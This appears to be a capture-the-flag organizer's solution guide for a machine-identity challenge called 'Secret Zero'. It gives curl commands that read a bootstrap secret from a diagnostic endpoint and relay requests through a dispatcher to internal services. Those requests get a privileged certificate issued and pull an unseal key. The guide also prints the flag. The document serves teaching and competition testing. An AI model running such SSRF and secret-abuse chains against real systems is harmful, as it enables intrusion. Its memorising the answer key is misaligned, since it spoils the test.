# X09 — Secret Zero (Organizer Solution & Architecture Guide)

## Challenge Summary
- **Name:** Secret Zero
- **Category:** Machine Identity / Certificates / Secret Bootstrap
- **Difficulty:** Expert / Bonus
- **External Port:** TCP/80 (HTTP)

---

## 🏛️ Architecture & Trust Chain

```text
Public Bootstrap Gateway (TCP/80)
               ↓ [Inspect agent.conf / bootstrap secret]
Internal Identity Authority (Port 8081)
               ↓ [Submit CSR with SAN 'vault-operator' + bootstrap secret]
Issued High-Trust Client Certificate
               ↓ [Present client certificate to Secret Service]
Internal Secret Service (Port 8082)
               ↓ [Extract Secret Zero Unseal Key]
Protected Target (Port 8083)
               ↓ [Unseal Doomsday Vault]
Isolated Flag Service (Port 8084)
               ↓
Captures Flag: YUVA{s3cr3t_z3r0_m4ch1n3_1d3nt1ty_b00tstr4p_pki_x09}
```

---

## 🛠️ Step-by-Step Exploit Walkthrough

### 1. Public Discovery
Send a GET request to the diagnostic endpoint:
```bash
curl -s http://localhost/api/diagnostics/view?item=bootstrap_agent.conf
```
Response contains:
- `bootstrap_authority`: `http://127.0.0.1:8081/api/v1/ca/issue`
- `secret_service_url`: `http://127.0.0.1:8082/api/v1/vault/secret-zero`
- `target_service_url`: `http://127.0.0.1:8083/api/v1/doomsday/unseal`
- `bootstrap_hmac_secret`: `latveria_boot_secret_...`
- Authorized high-trust identity: `spiffe://latveria.local/ns/core/sa/vault-operator`

### 2. Generate RSA Keypair & CSR
Generate a private key and a CSR with:
- Subject: `CN=vault-operator, O=Latveria Cyber Command`
- SAN: `spiffe://latveria.local/ns/core/sa/vault-operator`

### 3. Issue Machine Certificate via Mesh Dispatcher
Send the CSR and bootstrap secret to the Identity Authority:
```bash
curl -s -X POST http://localhost/api/mesh/dispatch \
  -H "Content-Type: application/json" \
  -d '{
    "target_url": "http://127.0.0.1:8081/api/v1/ca/issue",
    "method": "POST",
    "body": {
      "csr": "<CSR_PEM>",
      "bootstrap_secret": "<BOOTSTRAP_SECRET>",
      "requested_identity": "spiffe://latveria.local/ns/core/sa/vault-operator"
    }
  }'
```
Retrieve the issued X.509 Client Certificate PEM.

### 4. Authenticate to Secret Service
Present the certificate to the Secret Service:
```bash
curl -s -X POST http://localhost/api/mesh/dispatch \
  -H "Content-Type: application/json" \
  -d '{
    "target_url": "http://127.0.0.1:8082/api/v1/vault/secret-zero",
    "method": "POST",
    "body": {
      "client_certificate": "<ISSUED_CERT_PEM>"
    }
  }'
```
Extract the `secret_zero_key`.

### 5. Unseal Target & Retrieve Flag
Present the Secret Zero key to the Protected Target:
```bash
curl -s -X POST http://localhost/api/mesh/dispatch \
  -H "Content-Type: application/json" \
  -d '{
    "target_url": "http://127.0.0.1:8083/api/v1/doomsday/unseal",
    "method": "POST",
    "headers": {
      "Authorization": "Bearer <SECRET_ZERO_KEY>"
    }
  }'
```
Response returns the final flag!
